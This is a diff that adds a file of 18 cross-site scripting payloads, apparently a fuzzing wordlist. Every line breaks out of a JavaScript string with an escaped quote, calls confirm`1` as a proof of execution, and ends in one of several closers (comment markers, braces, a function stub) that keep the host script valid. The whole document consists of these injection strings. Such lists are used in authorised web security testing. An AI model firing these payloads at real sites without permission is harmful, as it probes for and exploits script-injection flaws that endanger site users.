@@ -1,0 +1,18 @@
+\"-confirm`1`//
+\"-confirm`1`<!--
+\"-confirm`1`%0A-->
+\"-confirm`1`}//
+\"-confirm`1`}<!--
+\"-confirm`1`}%0A-->
+\"-confirm`1`,//
+\"-confirm`1`,<!--
+\"-confirm`1`,%0A-->
+\"-confirm`1`};k={//
+\"-confirm`1`};k={<!--
+\"-confirm`1`};k={%0A-->
+\"}confirm`1`;k:{//
+\"}confirm`1`;k:{<!--
+\"}confirm`1`;k:{%0A-->
+\"}confirm`1`?0:function k(){//
+\"}confirm`1`?0:function k(){<!--
+\"}confirm`1`?0:function k(){%0A-->
